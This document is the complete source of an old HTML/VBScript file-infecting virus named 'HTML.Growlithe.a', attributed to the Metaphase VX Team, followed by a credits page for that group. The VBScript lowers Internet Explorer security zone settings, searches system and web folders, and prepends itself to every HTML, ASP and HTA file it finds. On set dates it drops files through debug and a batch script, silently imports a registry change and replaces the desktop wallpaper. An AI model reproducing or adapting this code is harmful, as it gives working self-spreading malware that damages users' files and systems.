<!--Growlithe-->
<HTML>
<BODY>
<SCRIPT Language = "JavaScript">
<!--
	var userAgent=navigator.appName;
	var agentInfo=userAgent.substring(0, 1);
    if(agentInfo == "M"){
}
else {
alert("The page you want to view was designed for Internet Explorer only, \n Please view this page with Internet Explorer")
self.close()
}
//-->
</SCRIPT>

<Script Language = "VBScript">
<!--
On Error Resume Next
'HTML.Growlithe.a
'By -KD- [Metaphase VX Team & NoMercyVirusTeam]
'Technology used from foxz [NoMercyVirusTeam]
'Part of the HTML Pokemon Family
'This Family goes out to IDT
Set WshShell = CreateObject("WScript.Shell")
WshShell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
If location.protocol = "file:" then
  Randomize
  Set TRange = document.body.createTextRange()
  HPath = Replace(location.href, "/", "\")
  Set FSO = CreateObject("Scripting.FileSystemObject")
  HPath = Replace(HPath, "file:\\\", "")
  HPath = FSO.GetParentFolderName(HPath)
  Call GetFolder(HPath)
  Call GetFolder("C:\")
  Call GetFolder("C:\My Documents")
  Call GetFolder("C:\Windows")
  Call GetFolder("C:\Windows\System")
  Call GetFolder("C:\Windows\ShellNew")
  Call GetFolder("C:\Windows\Help")
  Call GetFolder("C:\Windows\Temp")
  Call GetFolder("C:\Windows\Web")
  Call GetFolder("C:\Windows\Web\Wallpaper")
  Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
  Call GetFolder("C:\Inetpub\wwwroot")
  Call GetFolder("C:\Inetpub\wwwroot\myweb")
  Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
  Call GetFolder("C:\Program Files\Microsoft FrontPage\bin")	
End If
If Day(Now()) = 4 or Day(Now()) = 16 or Day(Now()) = 21  Then
  Set DropGrowlithe = FSO.CreateTextFile("c:\Windows\pokemon.dll", 2, False)
  DropGrowlithe.WriteLine "n Grow.jpg"
  DropGrowlithe.WriteLine "e 0100 ff d8 ff e0 00 10 4a 46 49 46 00 01 01 01 00 48 "
  DropGrowlithe.WriteLine "e 0110 00 48 00 00 ff db 00 43 00 0f 0a 0b 0d 0b 09 0f "
  DropGrowlithe.WriteLine "e 0120 0d 0c 0d 11 10 0f 11 16 25 18 16 14 14 16 2d 20 "
  DropGrowlithe.WriteLine "e 0130 22 1b 25 35 2f 38 37 34 2f 34 33 3b 42 55 48 3b "
  DropGrowlithe.WriteLine "e 0140 3f 50 3f 33 34 4a 64 4b 50 57 5a 5f 60 5f 39 47 "
  DropGrowlithe.WriteLine "e 0150 68 6f 67 5c 6e 55 5d 5f 5b ff db 00 43 01 10 11 "
  DropGrowlithe.WriteLine "e 0160 11 16 13 16 2b 18 18 2b 5b 3d 34 3d 5b 5b 5b 5b "
  DropGrowlithe.WriteLine "e 0170 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b "
  DropGrowlithe.WriteLine "e 0180 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b "
  DropGrowlithe.WriteLine "e 0190 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b ff c0 "
  DropGrowlithe.WriteLine "e 01a0 00 11 08 00 39 00 31 03 01 22 00 02 11 01 03 11 "
  DropGrowlithe.WriteLine "e 01b0 01 ff c4 00 1a 00 00 02 03 01 01 00 00 00 00 00 "
  DropGrowlithe.WriteLine "e 01c0 00 00 00 00 00 00 03 06 00 02 04 05 01 ff c4 00 "
  DropGrowlithe.WriteLine "e 01d0 2f 10 00 02 01 03 02 04 05 03 03 05 00 00 00 00 "
  DropGrowlithe.WriteLine "e 01e0 00 00 01 02 03 00 04 11 12 21 05 13 31 51 22 32 "
  DropGrowlithe.WriteLine "e 01f0 41 52 61 06 71 a1 14 42 b1 62 81 91 c1 f1 ff c4 "
  DropGrowlithe.WriteLine "e 0200 00 18 01 00 03 01 01 00 00 00 00 00 00 00 00 00 "
  DropGrowlithe.WriteLine "e 0210 00 00 00 01 02 03 00 04 ff c4 00 1c 11 00 03 01 "
  DropGrowlithe.WriteLine "e 0220 00 03 01 01 00 00 00 00 00 00 00 00 00 00 01 11 "
  DropGrowlithe.WriteLine "e 0230 02 03 12 21 13 22 ff da 00 0c 03 01 00 02 11 03 "
  DropGrowlithe.WriteLine "e 0240 11 00 3f 00 57 0c 73 53 51 26 bd 45 3e dc 8a b2 "
  DropGrowlithe.WriteLine "e 0250 47 cd 90 22 0d ce db d7 11 d6 0f 57 a1 ab 6e bd "
  DropGrowlithe.WriteLine "e 0260 46 05 35 5b fd 31 c3 e4 b5 5e 75 cb ac fd d4 8c "
  DropGrowlithe.WriteLine "e 0270 67 b6 2b 90 fc 29 13 8b fe 8e 59 09 40 7c c0 62 "
  DropGrowlithe.WriteLine "e 0280 b5 54 29 1c ec 82 b9 c8 fb 55 72 7a d3 6f 1b fa "
  DropGrowlithe.WriteLine "e 0290 7a ca 1e 14 93 d9 2e 97 88 78 8e 49 d4 3b 9a 52 "
  DropGrowlithe.WriteLine "e 02a0 60 eb be 82 b9 dc 0a c0 4d 33 dc 9a 95 5c b5 4a "
  DropGrowlithe.WriteLine "e 02b0 c1 08 71 9c 06 eb 44 b4 28 97 4b d4 8c d0 99 1d "
  DropGrowlithe.WriteLine "e 02c0 77 62 9f d8 8a f1 76 3a b2 06 3b 1a d2 8c 6d 37 "
  DropGrowlithe.WriteLine "e 02d0 57 2f 7c 4c 91 b0 24 e0 78 49 00 7c 53 2c 50 71 "
  DropGrowlithe.WriteLine "e 02e0 04 82 33 05 8b 5c 6b ea 35 05 20 77 c9 ae 2d 9d "
  DropGrowlithe.WriteLine "e 02f0 c4 e6 58 f4 0f 10 dc 82 3a d3 25 97 17 b9 54 60 "
  DropGrowlithe.WriteLine "e 0300 e2 38 82 fb ce 7f 8a 9b c6 35 a8 2b d6 92 33 f1 "
  DropGrowlithe.WriteLine "e 0310 06 92 ca 24 b5 95 48 9a 51 85 84 b0 3a be 3b 52 "
  DropGrowlithe.WriteLine "e 0320 85 ed c5 d9 bc 22 e6 29 63 cf a3 8c 53 7d cf 13 "
  DropGrowlithe.WriteLine "e 0330 8a f6 74 77 ba b4 66 88 e5 08 46 2c a7 fc 52 e7 "
  DropGrowlithe.WriteLine "e 0340 1d be 7b a9 94 48 d1 b3 26 d9 4e 95 55 c4 b3 e8 "
  DropGrowlithe.WriteLine "e 0350 8b 6d 98 35 2f cd 4a 16 ff 00 15 28 41 bd 33 2c "
  DropGrowlithe.WriteLine "e 0360 83 a9 5d fd 05 1a 2b a8 96 64 2c 87 ae f4 1c b3 "
  DropGrowlithe.WriteLine "e 0370 36 df 8a bd bc 6c 97 68 c7 21 73 da ba 5c 84 53 "
  DropGrowlithe.WriteLine "e 0380 69 8c b0 00 92 b4 dd 01 1e 1f f9 4c 7c 11 52 2b "
  DropGrowlithe.WriteLine "e 0390 7e 74 e8 39 cd df 1b 0a 54 6b 95 b5 29 cf 7e 58 "
  DropGrowlithe.WriteLine "e 03a0 6f 29 23 63 5a 53 8b 92 d8 d4 31 f7 cd 71 71 e7 "
  DropGrowlithe.WriteLine "e 03b0 f4 f4 57 7a f2 0d 53 5d c1 18 6d 10 c4 99 f5 44 "
  DropGrowlithe.WriteLine "e 03c0 00 ff 00 14 83 c5 52 24 be 93 92 0e 92 73 bf 7a "
  DropGrowlithe.WriteLine "e 03d0 ea dc 71 00 53 3a ff 00 35 c3 79 16 e2 46 65 39 "
  DropGrowlithe.WriteLine "e 03e0 00 e3 35 65 59 34 07 4d 4a 37 2c fb bf 35 2b 75 "
  DropGrowlithe.WriteLine "e 03f0 29 59 ac c4 a0 64 05 61 df 15 43 12 b7 47 02 89 "
  DropGrowlithe.WriteLine "e 0400 27 94 d6 35 eb 56 24 75 66 b8 e7 da c7 17 25 59 "
  DropGrowlithe.WriteLine "e 0410 93 62 c4 e7 fd 50 cc 50 47 e2 16 e8 57 a1 03 bf "
  DropGrowlithe.WriteLine "e 0420 7a 0c 3e 5a 2b 54 fe 49 3f 06 ee cf 61 8e 15 42 "
  DropGrowlithe.WriteLine "e 0430 24 88 3f 60 6b 34 b0 18 dc 85 c1 1f d3 d2 89 fb "
  DropGrowlithe.WriteLine "e 0440 85 5e 5e 83 ed 4d 9c 24 e8 3b 38 65 d0 7d a6 a5 "
  DropGrowlithe.WriteLine "e 0450 12 a5 34 40 a7 ff d9 "
  DropGrowlithe.WriteLine "RCX"
  DropGrowlithe.WriteLine "0357"
  DropGrowlithe.WriteLine "W"
  DropGrowlithe.WriteLine "Q"
  DropGrowlithe.Close
  Set MyBat = FSO.CreateTextFile("c:\Windows\WinStart.bat", 2, False)
  MyBat.WriteLine ""
  MyBat.WriteLine "@echo off"
  MyBat.WriteLine "debug < c:\Windows\pokemon.dll > nul"
  MyBat.WriteLine ""
  MyBat.Close
  Set MyReg = FSO.CreateTextFile("c:\Windows\pokemon.reg", 2, False)
  MyReg.WriteLine "REGEDIT4"
  MyReg.WriteLine ""
  MyReg.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer]"
  MyReg.WriteLine chr(34) & "ShellState" & chr(34) & "=hex:1c,00,00,00,e3,08,00,00,00,00,00,00,00,00,00,00,00,00,00,00,01,00,00,00,0a,00,00,00"
  MyReg.WriteLine ""
  WshShell.Run("regedit /s c:\Windows\pokemon.reg"), VbHide
  WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General\Wallpaper", "C:\Windows\Grow.jpg" 
  WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General\BackupWallpaper", "C:\Windows\Grow.jpg" 
  WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\desktop\TileWallpaper", "1"
  WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\desktop\Wallpaper", "C:\Windows\Grow.jpg" 
End If
Sub GetFolder(InfPath)
On Error Resume Next
Randomize
If FSO.FolderExists(InfPath) Then
  Do
  Set FolderObj = FSO.GetFolder(InfPath)
  InfPath = FSO.GetParentFolderName(InfPath)
  Set FO = FolderObj.Files
  For each NewFile in FO
  ExtName = Lcase(FSO.GetExtensionName(NewFile.Name))
  If ExtName = "htt" Or ExtName = "asp" Or ExtName = "htm" Or ExtName = "hta" _
 Or ExtName = "htx" Or ExtName = "html" Then
    Set MyGrowlithe = FSO.GetFile(NewFile.path)
    Set Growlithe = MyGrowlithe.OpenAsTextStream(1)
    GrowlitheCheck = Growlithe.readline
    Growlithe.close()
      If GrowlitheCheck <> "<!--Growlithe-->" then
      InfectFile NewFile.path
      End If
  End If
  Next
  Loop While FolderObj.IsRootFolder = False
End If
End Sub

Sub InfectFile(GetFileName)
On Error Resue Next
Randomize
Set MyGrowlithe = FSO.GetFile(GetFileName)
Set Growlithe = MyGrowlithe.OpenAsTextStream(1)
FileContents = Growlithe.ReadAll()
Growlithe.Close
Set MyGrowlithe = FSO.GetFile(GetFileName)
Set Growlithe = MyGrowlithe.OpenAsTextStream(2)
Growlithe.WriteLine "<!--Growlithe-->"
Growlithe.WriteLine "<html><body>"
Growlithe.WriteLine(TRange.htmlText)
Growlithe.Write("</body></html>" + Chr(13) + Chr(10))
Growlithe.Write FileContents
Growlithe.Close
End Sub
-->
</SCRIPT>
</BODY>
</HTML>
<HTML>
<HEAD>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
<TITLE>Metaphase VX Team</TITLE>
<STYLE TYPE="text/css">
.namelist {
	font-family : Times New Roman;
	color		: #ffffe0;
	font-size	: 18;
};
.thx {
	color		: #ffffe0;
	font-size	: 24;
	text-align	: center;
}
</STYLE>

<SCRIPT LANGUAGE=JavaScript>
var names = new Array (
'Knowdeth','Knowdeth',
'Sinixstar','Sinixstar',
'Demonphreak_','Demonphreak_',
'Sblip','Sblip',
'Raven','Raven',
'nucleii','nucleii',
'jackie','jackie',
'Evul','Evul',
'MetalKid','MetalKid',
'VxFaerie','VxFaerie',
'Lys Kovick','Lys Kovick',
'','',
'','',
'','',
'','',
'','',
'Specal Thanks To All The Beta Testers','BETA',
'and many many more...','',
'<BR><BR><BR>Welcome To<BR>A Member Of<BR>The<BR>HTML Pokemon<BR>Family<BR>By -KD-<BR>Metaphase <BR>&<BR> NoMercy<BR><BR>2000<BR>','thx0'
);

var namesIndex = 0;
var namesIndexOrg;

var pics = new Array (
	'c_place.jpg',	'1',
	'bld27.jpg',	'2',
	'brick.jpg',	'1',
	'welcome.jpg',	'2',
	'bld1678.jpg',	'1',
	'cd.jpg',		'2',
	'emp1.jpg',		'1',
	'emp3.jpg',		'2',
	'rtm1.jpg',		'1',
	'bus.jpg',		'2',
	'c_bike.jpg',	'3',
	'c_ftn1.jpg',	'1',
	'c_ftn3.jpg',	'2',
	'c_ftn4.jpg',	'1',
	'c_bird3.jpg',	'2',
	'c_bird2.jpg',	'3',
	'c_lake1.jpg',	'1',
	'c_lake2.jpg',	'2',
	'c_cafe.jpg',	'3',
	'c_recep.jpg',	'1',
	'c_sport.jpg',	'2',
	'hammer2.jpg',	'1',
	'piers.jpg',	'2',
	'kingdom.jpg',	'1',
	'needle.jpg',	'3',
	'sea-bld1.jpg',	'1',
	'sea-bld3.jpg',	'2',
	'train.jpg',	'1',
	'water2.jpg',	'3',
	'water1.jpg',	'1',
	'market.jpg',	'2'
);

var picsIndex = 0;

var creditsTimeout = 5500;
var picsTimeout = 2000;
var stopTimeout = 5000;

var nameCount = 21;
var nameX = document.all.name1;
var nameP = document.all.name2;

function showNames() {
	var nString = "";
	var i, j = names.length;
	var bEof = false;

	namesIndexOrg = -1;
	if (namefind.innerText != "") {
		for (i = 1; i < j; i += 2) {
			if (names[i] == namefind.innerText) {
				namesIndexOrg = namesIndex;
				namesIndex = i - 1;
				break;
			}
		}
	}

	for (i = 0; i < nameCount && namesIndex < j; 
				i++, namesIndex += 2) {
		if (names[namesIndex + 1] == 'thx0') {
			if (i)
				break;
			else
				bEof = true;
		}
		nString = nString + names[namesIndex] + "<BR>";
	}

	if (nameX == document.all.name2) {
		nameX = document.all.name1;
		nameP = document.all.name2;
	} else {
		nameX = document.all.name2;
		nameP = document.all.name1;
	}

	ShowHideObj(nameP, 0, 1);
	if (bEof)
		nameX = document.all.thxtext;
	nameX.innerHTML = nString;
	ShowHideObj(nameX, 1, 1);

	// restore the original index, if name jumped
	if (namesIndexOrg != -1) {
		namesIndex = namesIndexOrg;
		namefind.innerText = "";
	}		

	return (namesIndex < j);
};


function ShowHideObj(obj, bShowHide, bApply)
{
	var vis;

	vis = bShowHide == 1 ? "visible" : "hidden";

	if (screen.colorDepth >= 24)
		obj.style.visibility = vis;
	else {
		if (bApply == 1)
			obj.filters(0).apply();
		obj.style.visibility = vis;
		obj.filters(0).play();
	}
}

var imgX = document.all.img1;
var imgP = document.all.img2;
var prevImgType = '2';

function ShowPic() 
{
	switch (pics[picsIndex + 1]) {
	case '1':
		imgX = document.all.img1;
		break;
	case '2':
		imgX = document.all.img2;
		break;
	case '3':
		imgX = document.all.img3;
		break;
	}
	
	switch (prevImgType) {
	case '1':
		imgP = document.all.img1;
		break;
	case '2':
		imgP = document.all.img2;
		break;
	case '3':
		imgP = document.all.img3;
		break;
	}
	
	if (pics[picsIndex + 1] == '3') {
		ShowHideObj(frmLandscape, 0, 1);
		ShowHideObj(frmPortrait, 1, 1);
	}
	if (prevImgType == '3') {
		ShowHideObj(frmPortrait, 0, 1);
		ShowHideObj(frmLandscape, 1, 0);
	}

	prevImgType = pics[picsIndex + 1];
	
	ShowHideObj(imgP, 0, 1);
	imgX.innerHTML = "<IMG SRC=res://membg.dll/" + pics[picsIndex] + ">";
	ShowHideObj(imgX, 1, 1);
		
	picsIndex += 2;

	if (picsIndex >= pics.length)
		picsIndex = 0;
}


var bFullStop = false;

function credits()
{
	if (initxt.innerHTML != '') {
		initxt.innerHTML = '';
		ShowHideObj(initxt, 0, 1);
	}

	if (showNames())
		window.tm = setTimeout('credits();', creditsTimeout);
	else 
		window.tm = setTimeout('StopShow();', stopTimeout);
}


function StopShow()
{
	bFullStop = true;
	window.tm = setTimeout('closeProc();', 1);
}


function ShowImages() 
{
	if (frmLandscape.style.visibility == "hidden") 
		ShowHideObj(frmLandscape, 1, 1);

	ShowPic();

	if (bFullStop == false || (picsIndex < 1 || picsIndex > 4))
		window.tm = setTimeout('ShowImages();', picsTimeout);
}


function ShowNameImg()
{
	ShowHideObj(imgBkg, 1, 1);
	ShowHideObj(crd, 1, 1);

	document.all.initxt.innerHTML = 'The Metaphase VX Team<BR><BR>This list represents but a portion<BR>of the key people. through out the years.<BR><BR><BR><BR><BR><B>From Old School To New</B>'

	ShowHideObj(initxt, 1, 1);

	window.tm = setTimeout('ShowImages();', picsTimeout);
	window.tm = setTimeout('credits();', 8000);
}


function intro() 
{
	if (ShowNum())
		window.tm = setTimeout('intro();', 100);
	else {
		winnum.style.visibility = "hidden";
		ShowNameImg();
	}
}

var WinVerList = new Array (
	'&#139;&#139;',
	'&#140;&#139;',
	'&#140;&#141;',
	'&#142;&#141;',
	'&#142;&#143;',
	'&#144;&#143;',
	'&#144;&#145;',
	'&#146;&#145;',
	'&#148;&#147;',
	'&#137;&#136;',
	'&#148;&#147;',
	'&#137;&#136;',
	'&#148;&#147;'
);

var numIdx = 0;

function ShowNum() 
{
//useless section
};

</SCRIPT>

<script language=vbs>
dim strEmp : strEmp = ""
Sub keydownx()
	keyCode = window.event.keycode
	
	select case keyCode
	case 13
		namefind.innerText = strEmp
		strEmp = ""
	case 27
		strEmp = ""
	case else
		if (keyCode <= 255 AND keyCode >= 32) then
			strEmp = strEmp & chr(keyCode)
		end if
	end select
End sub

Sub closeProc()
	ON ERROR RESUME NEXT
End Sub
</script>

</HEAD>

<BODY BGCOLOR="#000000" ONLOAD="intro()" ONKEYDOWN="keydownx()">

<IMG id=imgBkg SRC="res://membg.dll/backgnd.gif" ALIGN="CENTER" VALIGN="CENTER" 
style="position:absolute; left:0; top:0; 
filter:revealTrans(duration=2.0,transition=7; z-index:1; visibility:hidden">

<DIV ID=name1 class="namelist" ALIGN=LEFT VALIGN=TOP
style="position:absolute; left:83; top:22; z-index:90;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<DIV ID=name2 class="namelist" ALIGN=LEFT VALIGN=TOP
style="position:absolute; left:83; top:22; z-index:90;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<DIV ID=thxtext class="thx" VALIGN=TOP
style="position:absolute; left:83; top:22; z-index:90; width:180;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<DIV ID=initxt class="thx" VALIGN=TOP
style="position:absolute; left:78; top:22; z-index:90; width:240; font-size:18;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<IMG id=frmLandscape SRC="res://membg.dll/frame0.jpg" 
style="position:absolute; left:330;top:49; z-index:90;
filter:blendTrans(duration=0.50); visibility:hidden">

<IMG id=frmPortrait SRC="res://membg.dll/frame1.jpg" 
style="position:absolute; left:339;top:38; z-index:90;
filter:blendTrans(duration=0.50); visibility:hidden">

<IMG id=logo SRC="res://membg.dll/logo.gif" 
style="position:absolute; left:278;top:370; z-index:90;
filter:blendTrans(duration=2.00); visibility:hidden">

<IMG id=crd SRC="res://membg.dll/credit.gif" 
style="position:absolute; left:22;top:22; z-index:90;
filter:revealTrans(duration=1.0,transition=5); visibility:hidden">

<DIV id=img1
style="position:absolute; left:344;top:65; z-index:90;
filter:blendTrans(duration=1.00); visibility:hidden">
</DIV>

<DIV id=img2
style="position:absolute; left:344;top:65; z-index:90;
filter:blendTrans(duration=1.00); visibility:hidden">
</DIV>

<DIV id=img3
style="position:absolute; left:358;top:61; z-index:90;
filter:blendTrans(duration=1.00); visibility:hidden">
</DIV>

<DIV ID=namefind></DIV>	

<DIV id=winnum ALIGN="CENTER" style="position:absolute; left:20;top:100; 
font-family:wingdings; font-size:180; font-weight:bold; color:#0000ff;	
visibility=hidden"></DIV>

<!-- CT id="discwav" style = "visibility:hidden"
	classid="CLSID:05589FA1-C356-11CE-BF01-00AA0055595A">
	<PARAM NAME="ShowDisplay" VALUE="-1">
	<PARAM NAME="AutoStart" VALUE="1">
	<PARAM NAME="AutoRewind" VALUE="1">
	<PARAM NAME="PlayCount" VALUE="8">
	<PARAM NAME="FileName" VALUE="C:\WINDOWS\Application Data\Microsoft\WELCOME\welcom98.wav">

</OBJE-->
</BODY>
</HTML>